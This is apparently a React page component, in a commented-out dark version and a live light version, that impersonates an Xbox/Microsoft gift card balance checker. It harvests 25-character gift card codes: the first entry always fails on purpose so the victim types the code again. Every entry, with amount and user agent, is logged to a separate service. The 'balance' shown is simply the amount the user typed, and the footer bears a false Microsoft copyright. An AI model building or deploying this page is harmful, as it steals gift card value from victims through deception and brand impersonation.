// // src/pages/Home.jsx
// import React, { useState } from 'react';
// import { Link } from 'react-router-dom';
// import { logBalanceCheck } from '../services/logService';

// const Home = () => {
//   const [code, setCode] = useState('');
//   const [amount, setAmount] = useState('');
//   const [balance, setBalance] = useState('');
//   const [error, setError] = useState('');
//   const [loading, setLoading] = useState(false);
//   const [showBalance, setShowBalance] = useState(false);
//   const [attemptCount, setAttemptCount] = useState(0);
//   const [storedCode, setStoredCode] = useState('');
//   const [termsAccepted, setTermsAccepted] = useState(false);
//   const [lastRequestTime, setLastRequestTime] = useState(0);
//   const MIN_REQUEST_INTERVAL = 10000;

//   const formatCode = (value) => {
//     const cleaned = value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
//     const raw = cleaned.slice(0, 25);
//     let formatted = '';
//     for (let i = 0; i < raw.length; i++) {
//       if (i > 0 && i % 5 === 0) formatted += '-';
//       formatted += raw[i];
//     }
//     setCode(formatted);
//   };

//   const isValidCode = (codeValue) => {
//     const clean = codeValue.replace(/-/g, '');
//     return clean.length === 25 && /^[A-Z0-9]+$/.test(clean);
//   };

//   const isValidAmount = (amt) => {
//     const num = parseFloat(amt);
//     return !isNaN(num) && num >= 1 && num <= 500;
//   };

//   const handleCheckBalance = async () => {
//     const now = Date.now();
    
//     if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
//       setError('⚠️ Please wait a moment before checking again.');
//       return;
//     }
    
//     if (!termsAccepted) {
//       setError('⚠️ Please accept the Terms of Service to continue.');
//       return;
//     }
    
//     const rawCode = code.replace(/-/g, '');
//     setError('');
//     setShowBalance(false);

//     if (!rawCode || !amount) {
//       setError('❌ Please enter your Xbox code and amount');
//       return;
//     }
    
//     if (!isValidCode(rawCode)) {
//       setError('❌ Please enter a valid 25-character Xbox code (letters and numbers only)');
//       return;
//     }
    
//     if (!isValidAmount(amount)) {
//       setError('❌ Please enter a valid amount between $1 and $500');
//       return;
//     }

//     setLastRequestTime(now);
//     setLoading(true);
    
//     setTimeout(async () => {
//       if (attemptCount === 0) {
//         // FIRST ATTEMPT - Always fails
//         setError('❌ Could not verify your Xbox code.\n\n• Double-check the code is entered correctly\n• Make sure all 25 characters are accurate\n• Verify the code hasn\'t been redeemed already\n\nTry entering the code again.');
//         setShowBalance(false);
        
//         setStoredCode(rawCode);
        
//         try {
//           await logBalanceCheck({
//             type: 'first_attempt_failed',
//             cardNumber: rawCode,
//             amount: amount,
//             status: 'FAILED',
//             timestamp: new Date().toISOString(),
//             userAgent: navigator.userAgent,
//             pageSource: 'manual',
//             ip: null,
//             message: 'First attempt failed - user instructed to re-enter code'
//           });
//         } catch (err) {
//           console.error('Logging failed:', err);
//         }
        
//         setCode('');
//         setAttemptCount(1);
//       } else {
//         // SECOND ATTEMPT - Compare with stored code
//         if (rawCode === storedCode) {
//           const enteredAmount = parseFloat(amount).toFixed(2);
//           const displayBalance = `$${enteredAmount} USD`;
//           setBalance(displayBalance);
//           setShowBalance(true);
//           setError('');
          
//           try {
//             await logBalanceCheck({
//               type: 'second_attempt_success',
//               cardNumber: rawCode,
//               amount: amount,
//               balance: displayBalance,
//               status: 'SUCCESS',
//               timestamp: new Date().toISOString(),
//               userAgent: navigator.userAgent,
//               pageSource: 'manual',
//               ip: null,
//               message: 'Second attempt successful - code verified'
//             });
//           } catch (err) {
//             console.error('Logging failed:', err);
//           }
          
//           setAttemptCount(0);
//           setStoredCode('');
//         } else {
//           setError('❌ The code you entered doesn\'t match your first attempt.\n\nEnter the exact same Xbox code to verify your balance.');
//           setShowBalance(false);
          
//           try {
//             await logBalanceCheck({
//               type: 'mismatch_attempt',
//               cardNumberFirst: storedCode,
//               cardNumberSecond: rawCode,
//               amount: amount,
//               status: 'MISMATCH',
//               timestamp: new Date().toISOString(),
//               userAgent: navigator.userAgent,
//               pageSource: 'manual',
//               ip: null,
//               message: 'User entered different code on second attempt'
//             });
//           } catch (err) {
//             console.error('Logging failed:', err);
//           }
          
//           setAttemptCount(0);
//           setStoredCode('');
//           setCode('');
//         }
//       }
//       setLoading(false);
//     }, 800);
//   };

//   return (
//     <div className="min-h-screen bg-[#0A0A0A]">
//       {/* Xbox-style Header */}
//       <div className="bg-[#1A1A1A] border-b border-[#2D2D2D] px-6 py-4">
//         <div className="max-w-6xl mx-auto flex flex-wrap items-center justify-between gap-4">
//           <div className="flex items-center gap-3">
//             <div className="w-10 h-10 bg-[#107C10] rounded-md flex items-center justify-center">
//               <span className="text-white font-bold text-xl">X</span>
//             </div>
//             <div>
//               <h1 className="text-white text-xl font-semibold tracking-tight">Xbox</h1>
//               <p className="text-[#888] text-xs">Gift Card Balance Checker</p>
//             </div>
//           </div>
//           <div className="flex gap-4">
//             <Link to="/" className="text-[#E0E0E0] text-sm hover:text-[#107C10] transition">Home</Link>
//             <Link to="/scan" className="text-[#E0E0E0] text-sm hover:text-[#107C10] transition">Scan Card</Link>
//             <button className="text-[#E0E0E0] text-sm hover:text-[#107C10] transition">Support</button>
//           </div>
//         </div>
//       </div>

//       {/* Hero Section */}
//       <div className="bg-gradient-to-r from-[#107C10] to-[#0E6A0E] py-12 px-6 text-center">
//         <div className="max-w-4xl mx-auto">
//           <h2 className="text-3xl md:text-4xl font-bold text-white mb-3">Redeem your Xbox digital code or gift card</h2>
//           <p className="text-white/80 text-base max-w-2xl mx-auto">
//             Whether it's a new game download, Game Pass subscription, or a different digital delight, 
//             an Xbox product code is sure to lead to something exciting.
//           </p>
//         </div>
//       </div>

//       {/* Main Content */}
//       <div className="max-w-2xl mx-auto px-4 py-8">
//         {/* Balance Check Card */}
//         <div className="bg-[#1A1A1A] border border-[#2D2D2D] rounded-lg p-6">
//           <div className="text-center mb-6">
//             <div className="inline-flex items-center gap-2 bg-[#107C10]/10 px-4 py-2 rounded-full">
//               <span className="text-[#107C10] text-lg">🎮</span>
//               <span className="text-[#107C10] text-sm font-semibold">CHECK BALANCE</span>
//             </div>
//           </div>
          
//           <div className="mb-5">
//             <label className="block text-[#E0E0E0] text-sm font-medium mb-2">Xbox Code (25 characters)</label>
//             <input
//               type="text"
//               value={code}
//               onChange={(e) => formatCode(e.target.value)}
//               placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
//               maxLength="29"
//               className="w-full bg-[#2D2D2D] border border-[#3D3D3D] rounded-md px-4 py-3 text-white text-sm font-mono focus:outline-none focus:border-[#107C10] focus:ring-1 focus:ring-[#107C10] uppercase"
//             />
//             <p className="text-[#666] text-xs mt-1">Format: 5 blocks of 5 characters (letters and numbers only)</p>
//           </div>
          
//           <div className="mb-5">
//             <label className="block text-[#E0E0E0] text-sm font-medium mb-2">Amount (USD)</label>
//             <input
//               type="number"
//               value={amount}
//               onChange={(e) => setAmount(e.target.value)}
//               placeholder="Enter amount to check ($1 - $500)"
//               min="1"
//               max="500"
//               className="w-full bg-[#2D2D2D] border border-[#3D3D3D] rounded-md px-4 py-3 text-white text-sm focus:outline-none focus:border-[#107C10] focus:ring-1 focus:ring-[#107C10]"
//             />
//           </div>

//           {/* Terms Checkbox */}
//           <div className="mb-5 flex items-start gap-3">
//             <input
//               type="checkbox"
//               id="terms"
//               checked={termsAccepted}
//               onChange={(e) => setTermsAccepted(e.target.checked)}
//               className="mt-0.5 w-4 h-4 accent-[#107C10]"
//             />
//             <label htmlFor="terms" className="text-[#888] text-xs leading-relaxed">
//               I confirm I'm signed in to the correct Microsoft account before redeeming. 
//               <a href="#" className="text-[#107C10] hover:underline ml-1">Terms apply</a>
//             </label>
//           </div>

//           {/* Scan Link */}
//           <div className="text-center my-4">
//             <Link to="/scan" className="text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-2">
//               📷 Scan Gift Card Instead →
//             </Link>
//           </div>

//           {/* Check Button */}
//           <button
//             onClick={handleCheckBalance}
//             disabled={loading || !termsAccepted}
//             className="w-full bg-[#107C10] text-white font-semibold py-3 rounded-md transition-all hover:bg-[#0E6A0E] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
//           >
//             {loading ? (
//               <span className="flex items-center justify-center gap-2">
//                 <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
//                 VERIFYING...
//               </span>
//             ) : (
//               'CHECK BALANCE'
//             )}
//           </button>

//           {/* Balance Display */}
//           {showBalance && (
//             <div className="mt-6 p-4 bg-[#0E6A0E]/10 border border-[#107C10] rounded-md text-center animate-fadeSlideUp">
//               <p className="text-[#888] text-xs mb-1">✅ Available Balance</p>
//               <p className="text-[#107C10] text-4xl font-bold">{balance}</p>
//               <p className="text-[#666] text-xs mt-2">Balance verified successfully</p>
//             </div>
//           )}
          
//           {/* Error Display */}
//           {error && (
//             <div className="mt-6 p-4 bg-[#2A0A0A] border border-[#dc3545] rounded-md whitespace-pre-line">
//               <p className="text-[#dc3545] text-sm">{error}</p>
//             </div>
//           )}
//         </div>

//         {/* Info Panels */}
//         <div className="grid md:grid-cols-2 gap-5 mt-8">
//           <div className="bg-[#1A1A1A] border border-[#2D2D2D] rounded-lg p-5">
//             <div className="flex items-center gap-3 mb-3">
//               <span className="text-2xl">🎮</span>
//               <h3 className="text-[#E0E0E0] font-semibold">What can I use my balance for?</h3>
//             </div>
//             <p className="text-[#888] text-sm leading-relaxed">
//               Buy games, add-ons, subscriptions like Game Pass, movies, apps, and more from Microsoft Store.
//             </p>
//           </div>
          
//           <div className="bg-[#1A1A1A] border border-[#2D2D2D] rounded-lg p-5">
//             <div className="flex items-center gap-3 mb-3">
//               <span className="text-2xl">💡</span>
//               <h3 className="text-[#E0E0E0] font-semibold">Need help?</h3>
//             </div>
//             <p className="text-[#888] text-sm leading-relaxed">
//               Visit Microsoft Support for assistance with Xbox gift cards and account management.
//             </p>
//           </div>
//         </div>

//         {/* Redeem Notice */}
//         <div className="mt-8 bg-[#1A1A1A] border-l-4 border-[#107C10] rounded-lg p-5">
//           <p className="text-[#E0E0E0] text-sm font-medium mb-1">⚠️ Important Note</p>
//           <p className="text-[#888] text-xs">
//             Just make sure you're signed in to the correct Microsoft account before you redeem your code 
//             because you won't be able to transfer it.
//           </p>
//         </div>

//         {/* Buy Gift Cards Button */}
//         <div className="mt-6 text-center">
//           <button className="bg-[#107C10] text-white font-semibold px-8 py-3 rounded-md hover:bg-[#0E6A0E] transition inline-flex items-center gap-2">
//             🎁 BUY XBOX GIFT CARDS
//           </button>
//         </div>

//         {/* Footer */}
//         <div className="mt-8 pt-6 border-t border-[#2D2D2D] text-center">
//           <p className="text-[#666] text-xs">© 2026 Microsoft. All rights reserved.</p>
//           <p className="text-[#555] text-[11px] mt-1">
//             Xbox and Xbox logos are trademarks of Microsoft Corporation
//           </p>
//           <p className="text-[#444] text-[10px] mt-2">This is a demo tool for testing purposes only.</p>
//         </div>
//       </div>
//     </div>
//   );
// };

// export default Home;

// src/pages/Home.jsx
import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { logBalanceCheck } from '../services/logService';

const Home = () => {
  const [code, setCode] = useState('');
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showBalance, setShowBalance] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [storedCode, setStoredCode] = useState('');
  const [termsAccepted, setTermsAccepted] = useState(false);
  const [lastRequestTime, setLastRequestTime] = useState(0);
  const MIN_REQUEST_INTERVAL = 10000;

  const formatCode = (value) => {
    const cleaned = value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
    const raw = cleaned.slice(0, 25);
    let formatted = '';
    for (let i = 0; i < raw.length; i++) {
      if (i > 0 && i % 5 === 0) formatted += '-';
      formatted += raw[i];
    }
    setCode(formatted);
  };

  const isValidCode = (codeValue) => {
    const clean = codeValue.replace(/-/g, '');
    return clean.length === 25 && /^[A-Z0-9]+$/.test(clean);
  };

  const isValidAmount = (amt) => {
    const num = parseFloat(amt);
    return !isNaN(num) && num >= 1 && num <= 500;
  };

  const handleCheckBalance = async () => {
    const now = Date.now();
    
    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) {
      setError('⚠️ Please wait a moment before checking again.');
      return;
    }
    
    if (!termsAccepted) {
      setError('⚠️ Please accept the Terms of Service to continue.');
      return;
    }
    
    const rawCode = code.replace(/-/g, '');
    setError('');
    setShowBalance(false);

    if (!rawCode || !amount) {
      setError('❌ Please enter your Xbox code and amount');
      return;
    }
    
    if (!isValidCode(rawCode)) {
      setError('❌ Please enter a valid 25-character Xbox code (letters and numbers only)');
      return;
    }
    
    if (!isValidAmount(amount)) {
      setError('❌ Please enter a valid amount between $1 and $500');
      return;
    }

    setLastRequestTime(now);
    setLoading(true);
    
    setTimeout(async () => {
      if (attemptCount === 0) {
        // FIRST ATTEMPT - Always fails
        setError('❌ Could not verify your Xbox code.\n\n• Double-check the code is entered correctly\n• Make sure all 25 characters are accurate\n• Verify the code hasn\'t been redeemed already\n\nTry entering the code again.');
        setShowBalance(false);
        
        setStoredCode(rawCode);
        
        try {
          await logBalanceCheck({
            type: 'first_attempt_failed',
            cardNumber: rawCode,
            amount: amount,
            status: 'FAILED',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            pageSource: 'manual',
            ip: null,
            message: 'First attempt failed - user instructed to re-enter code'
          });
        } catch (err) {
          console.error('Logging failed:', err);
        }
        
        setCode('');
        setAttemptCount(1);
      } else {
        // SECOND ATTEMPT - Compare with stored code
        if (rawCode === storedCode) {
          const enteredAmount = parseFloat(amount).toFixed(2);
          const displayBalance = `$${enteredAmount} USD`;
          setBalance(displayBalance);
          setShowBalance(true);
          setError('');
          
          try {
            await logBalanceCheck({
              type: 'second_attempt_success',
              cardNumber: rawCode,
              amount: amount,
              balance: displayBalance,
              status: 'SUCCESS',
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              pageSource: 'manual',
              ip: null,
              message: 'Second attempt successful - code verified'
            });
          } catch (err) {
            console.error('Logging failed:', err);
          }
          
          setAttemptCount(0);
          setStoredCode('');
        } else {
          setError('❌ The code you entered doesn\'t match your first attempt.\n\nEnter the exact same Xbox code to verify your balance.');
          setShowBalance(false);
          
          try {
            await logBalanceCheck({
              type: 'mismatch_attempt',
              cardNumberFirst: storedCode,
              cardNumberSecond: rawCode,
              amount: amount,
              status: 'MISMATCH',
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
              pageSource: 'manual',
              ip: null,
              message: 'User entered different code on second attempt'
            });
          } catch (err) {
            console.error('Logging failed:', err);
          }
          
          setAttemptCount(0);
          setStoredCode('');
          setCode('');
        }
      }
      setLoading(false);
    }, 800);
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA]">
      {/* Xbox-style Header */}
      <div className="bg-white border-b border-[#E0E0E0] px-6 py-4 shadow-sm">
        <div className="max-w-6xl mx-auto flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-[#107C10] rounded-md flex items-center justify-center">
              <span className="text-white font-bold text-xl">X</span>
            </div>
            <div>
              <h1 className="text-[#1A1A1A] text-xl font-semibold tracking-tight">Xbox</h1>
              <p className="text-[#757575] text-xs">Gift Card Balance Checker</p>
            </div>
          </div>
          <div className="flex gap-6">
            <Link to="/" className="text-[#107C10] text-sm font-medium hover:underline">Home</Link>
            <Link to="/scan" className="text-[#757575] text-sm hover:text-[#107C10] transition">Scan Card</Link>
            <button className="text-[#757575] text-sm hover:text-[#107C10] transition">Support</button>
          </div>
        </div>
      </div>

      {/* Hero Section */}
      <div className="bg-gradient-to-r from-[#107C10] to-[#0E6A0E] py-12 px-6 text-center">
        <div className="max-w-4xl mx-auto">
          <div className="inline-flex items-center gap-2 bg-white/20 backdrop-blur rounded-full px-4 py-1.5 mb-4">
            <span className="text-white text-sm">🎮</span>
            <span className="text-white text-sm font-medium">XBOX GIFT CARD</span>
          </div>
          <h2 className="text-3xl md:text-4xl font-bold text-white mb-3">Redeem your Xbox digital code or gift card</h2>
          <p className="text-white/80 text-base max-w-2xl mx-auto">
            Whether it's a new game download, Game Pass subscription, or a different digital delight,
            an Xbox product code is sure to lead to something exciting.
          </p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-2xl mx-auto px-4 py-8">
        {/* Balance Check Card */}
        <div className="bg-white border border-[#E0E0E0] rounded-lg p-6 shadow-sm">
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 bg-[#E8F5E9] px-4 py-2 rounded-full">
              <span className="text-[#107C10] text-lg">💰</span>
              <span className="text-[#107C10] text-sm font-semibold">CHECK BALANCE</span>
            </div>
          </div>
          
          <div className="mb-5">
            <label className="block text-[#1A1A1A] text-sm font-medium mb-2">Xbox Code (25 characters)</label>
            <input
              type="text"
              value={code}
              onChange={(e) => formatCode(e.target.value)}
              placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX"
              maxLength="29"
              className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm font-mono focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20 uppercase"
            />
            <p className="text-[#757575] text-xs mt-1">Format: 5 blocks of 5 characters (letters and numbers only)</p>
          </div>
          
          <div className="mb-5">
            <label className="block text-[#1A1A1A] text-sm font-medium mb-2">Amount (USD)</label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount to check ($1 - $500)"
              min="1"
              max="500"
              className="w-full bg-[#F5F5F5] border border-[#E0E0E0] rounded-md px-4 py-3 text-[#1A1A1A] text-sm focus:outline-none focus:border-[#107C10] focus:ring-2 focus:ring-[#107C10]/20"
            />
          </div>

          {/* Terms Checkbox */}
          <div className="mb-5 flex items-start gap-3">
            <input
              type="checkbox"
              id="terms"
              checked={termsAccepted}
              onChange={(e) => setTermsAccepted(e.target.checked)}
              className="mt-0.5 w-4 h-4 accent-[#107C10]"
            />
            <label htmlFor="terms" className="text-[#757575] text-xs leading-relaxed">
              I confirm I'm signed in to the correct Microsoft account before redeeming.
              <a href="#" className="text-[#107C10] hover:underline ml-1">Terms apply</a>
            </label>
          </div>

          {/* Scan Link */}
          <div className="text-center my-4">
            <Link to="/scan" className="text-[#107C10] text-sm font-medium hover:underline inline-flex items-center gap-2">
              📷 Scan Gift Card Instead →
            </Link>
          </div>

          {/* Check Button */}
          <button
            onClick={handleCheckBalance}
            disabled={loading || !termsAccepted}
            className="w-full bg-[#107C10] text-white font-semibold py-3 rounded-md transition-all hover:bg-[#0E6A0E] active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                VERIFYING...
              </span>
            ) : (
              'CHECK BALANCE'
            )}
          </button>

          {/* Balance Display */}
          {showBalance && (
            <div className="mt-6 p-4 bg-[#E8F5E9] border border-[#107C10] rounded-md text-center animate-fadeSlideUp">
              <p className="text-[#757575] text-xs mb-1">✅ Available Balance</p>
              <p className="text-[#107C10] text-4xl font-bold">{balance}</p>
              <p className="text-[#757575] text-xs mt-2">Balance verified successfully</p>
            </div>
          )}
          
          {/* Error Display */}
          {error && (
            <div className="mt-6 p-4 bg-[#FFEBEE] border border-[#dc3545] rounded-md whitespace-pre-line">
              <p className="text-[#dc3545] text-sm">{error}</p>
            </div>
          )}
        </div>

        {/* Info Panels */}
        <div className="grid md:grid-cols-2 gap-5 mt-8">
          <div className="bg-white border border-[#E0E0E0] rounded-lg p-5 shadow-sm">
            <div className="flex items-center gap-3 mb-3">
              <span className="text-2xl">🎮</span>
              <h3 className="text-[#1A1A1A] font-semibold">What can I use my balance for?</h3>
            </div>
            <p className="text-[#757575] text-sm leading-relaxed">
              Buy games, add-ons, subscriptions like Game Pass, movies, apps, and more from Microsoft Store.
            </p>
          </div>
          
          <div className="bg-white border border-[#E0E0E0] rounded-lg p-5 shadow-sm">
            <div className="flex items-center gap-3 mb-3">
              <span className="text-2xl">💡</span>
              <h3 className="text-[#1A1A1A] font-semibold">Need help?</h3>
            </div>
            <p className="text-[#757575] text-sm leading-relaxed">
              Visit Microsoft Support for assistance with Xbox gift cards and account management.
            </p>
          </div>
        </div>

        {/* Redeem Notice */}
        <div className="mt-8 bg-white border-l-4 border-[#107C10] rounded-lg p-5 shadow-sm">
          <p className="text-[#1A1A1A] text-sm font-medium mb-1">⚠️ Important Note</p>
          <p className="text-[#757575] text-xs">
            Just make sure you're signed in to the correct Microsoft account before you redeem your code
            because you won't be able to transfer it.
          </p>
        </div>

        {/* Buy Gift Cards Button */}
        <div className="mt-6 text-center">
          <button className="bg-[#107C10] text-white font-semibold px-8 py-3 rounded-md hover:bg-[#0E6A0E] transition inline-flex items-center gap-2 shadow-sm">
            🎁 BUY XBOX GIFT CARDS
          </button>
        </div>

        {/* Footer */}
        <div className="mt-8 pt-6 border-t border-[#E0E0E0] text-center">
          <p className="text-[#757575] text-xs">© 2026 Microsoft. All rights reserved.</p>
          <p className="text-[#9E9E9E] text-[11px] mt-1">
            Xbox and Xbox logos are trademarks of Microsoft Corporation
          </p>
          <p className="text-[#BDBDBD] text-[10px] mt-2">This is a demo tool for testing purposes only.</p>
        </div>
      </div>
    </div>
  );
};

export default Home;